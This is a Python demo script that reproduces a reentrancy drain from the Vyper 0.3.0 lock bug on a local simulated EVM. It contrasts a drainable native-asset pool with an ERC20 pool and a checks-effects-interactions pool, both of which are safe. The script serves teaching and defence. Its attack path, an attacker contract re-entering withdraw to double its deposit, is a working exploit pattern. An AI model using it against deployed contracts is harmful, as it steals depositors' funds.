"""Run from this directory. The reentrancy lock bug lives in the Vyper 0.3.0
compiler, so the toolchain is pinned (uv fetches all of it):

  uv run --python 3.10 --with 'vyper==0.3.0' --with pyrevm --with eth-abi --with eth-utils demo.py

One pool (pool.vy) deployed three ways, isolating one variable each time:
  - native asset, interaction before effect -> drained,
  - ERC20 asset, same lock -> safe, because the transfer has no callback,
  - native asset, effect before interaction (CEI) -> safe, the attack reverts.

The pool carries one correct @nonreentrant('lock') key on both withdraw paths.
Vyper 0.3.0 splits that shared key across two storage slots, which is what lets
the native-asset attack re-enter. Recompiling pool.vy with 0.3.1 or later keeps
the lock and the attack reverts.
"""

import os

from evm import UNIT, ZERO, account, call, deploy, read
from pyrevm import EVM

HERE = os.path.dirname(os.path.abspath(__file__))
POOL = os.path.join(HERE, "pool.vy")
ATTACKER = os.path.join(HERE, "attacker.vy")
ASSET = os.path.join(HERE, "..", "mock_erc20_asset.vy")

DEPLOYER = account(0xD)


def fresh_evm() -> EVM:
    """A clean EVM with the deployer funded enough to cover any gas and value."""
    evm = EVM()
    evm.set_balance(DEPLOYER, 100 * UNIT)
    return evm


def native_asset_pool_is_drained():
    """The native asset pays before the ledger is zeroed, so the attacker
    re-enters withdraw_to() and walks away with two units for a one-unit deposit.
    """
    print("== native-asset pool (interaction before effect) ==")
    evm = fresh_evm()

    # the drainable variant: pays the native asset, before zeroing the ledger
    pool = deploy(evm, DEPLOYER, POOL, [True, False, ZERO])

    # an honest depositor seeds the pool with 5 units
    victim = account(0x5108)
    evm.set_balance(victim, 5 * UNIT)
    call(evm, victim, pool, "deposit()", value=5 * UNIT)
    print(
        "  honest depositor puts in 5 units; "
        f"pool holds {evm.get_balance(pool) // UNIT} units"
    )

    # the attacker deposits 1 unit; withdraw() re-enters on the payout callback
    attacker = deploy(evm, DEPLOYER, ATTACKER, [pool, ZERO])
    eoa = account(0xEA)
    evm.set_balance(eoa, 1 * UNIT)
    print("  attacker deposits 1 unit and calls withdraw() ...")
    call(evm, eoa, attacker, "attack()", value=1 * UNIT)

    # the attacker doubled its money; the pool can no longer cover the depositor
    drained = evm.get_balance(attacker)
    pool_left = evm.get_balance(pool)
    reentered = read(evm, attacker, "reentered()", ["bool"])
    owed = read(evm, pool, "deposits(address)", ["uint256"], [victim])
    print(f"  attacker re-entered through the native-asset callback: {reentered}")
    print(f"  attacker now holds {drained // UNIT} units for a 1 unit deposit")
    print(
        f"  pool holds {pool_left // UNIT} units "
        f"but owes the depositor {owed // UNIT}: insolvent"
    )

    assert reentered is True
    assert drained == 2 * UNIT and pool_left == 4 * UNIT
    print("  -> drained, as expected\n")


def erc20_asset_pool_is_safe():
    """An ERC20 transfer never calls back into the pool, so the same broken lock
    is harmless: __default__ never fires and nothing is re-entered.
    """
    print("== ERC20 asset pool (same lock, no callback) ==")
    evm = fresh_evm()

    # same pool, paying an ERC20 asset instead of the native one
    asset = deploy(evm, DEPLOYER, ASSET)
    pool = deploy(evm, DEPLOYER, POOL, [False, False, asset])

    # the victim mints, approves, and deposits 5 units of the asset
    victim = account(0x5108)
    call(evm, DEPLOYER, asset, "mint(address,uint256)", [victim, 5 * UNIT])
    call(evm, victim, asset, "approve(address,uint256)", [pool, 5 * UNIT])
    call(evm, victim, pool, "deposit(uint256)", [5 * UNIT])

    # the attacker runs the identical script against the asset pool
    attacker = deploy(evm, DEPLOYER, ATTACKER, [pool, asset])
    call(evm, DEPLOYER, asset, "mint(address,uint256)", [attacker, 1 * UNIT])
    print("  attacker deposits 1 unit and runs the same attack ...")
    call(evm, account(0xEA), attacker, "attack(uint256)", [1 * UNIT])

    # the transfer had no callback, so nothing re-entered and balances are intact
    reentered = read(evm, attacker, "reentered()", ["bool"])
    attacker_held = read(evm, asset, "balanceOf(address)", ["uint256"], [attacker])
    pool_held = read(evm, asset, "balanceOf(address)", ["uint256"], [pool])
    print(f"  attacker re-entered: {reentered} (no callback to re-enter through)")
    print(
        f"  attacker holds {attacker_held // UNIT} unit; "
        f"pool holds {pool_held // UNIT} units: solvent"
    )

    assert reentered is False
    assert attacker_held == 1 * UNIT and pool_held == 5 * UNIT
    print("  -> safe, as expected\n")


def cei_pool_defeats_the_attack():
    """Zeroing the ledger before the payout makes the re-entrant withdraw_to()
    read a zero balance and revert, so checks-effects-interactions stops the
    drain even with the broken lock and the native asset.
    """
    print("== native-asset pool with checks-effects-interactions (effect first) ==")
    evm = fresh_evm()

    # the native pool again, but this one zeroes the ledger before paying out
    pool = deploy(evm, DEPLOYER, POOL, [True, True, ZERO])

    victim = account(0x5108)
    evm.set_balance(victim, 5 * UNIT)
    call(evm, victim, pool, "deposit()", value=5 * UNIT)

    # the happy path is unchanged: an honest user deposits and withdraws normally
    alice = account(0xA11CE)
    evm.set_balance(alice, 3 * UNIT)
    call(evm, alice, pool, "deposit()", value=3 * UNIT)
    call(evm, alice, pool, "withdraw()")
    print(
        "  honest user withdrew normally and "
        f"holds {evm.get_balance(alice) // UNIT} units again"
    )
    assert evm.get_balance(alice) == 3 * UNIT

    # the same attack now reverts: the re-entrant call reads a zeroed balance
    attacker = deploy(evm, DEPLOYER, ATTACKER, [pool, ZERO])
    eoa = account(0xEA)
    evm.set_balance(eoa, 1 * UNIT)
    print("  attacker runs the same re-entrancy ...")

    reverted = False
    try:
        call(evm, eoa, attacker, "attack()", value=1 * UNIT)
    except RuntimeError:
        reverted = True

    print(
        "  the re-entrant withdraw_to() reads a zeroed balance and reverts; "
        f"pool still holds {evm.get_balance(pool) // UNIT} units"
    )
    assert reverted, "the attack was expected to revert"
    assert evm.get_balance(pool) == 5 * UNIT
    print(
        "  -> CEI defeats the attack even with the broken lock and the native asset\n"
    )


def main():
    native_asset_pool_is_drained()
    erc20_asset_pool_is_safe()
    cei_pool_defeats_the_attack()


if __name__ == "__main__":
    main()
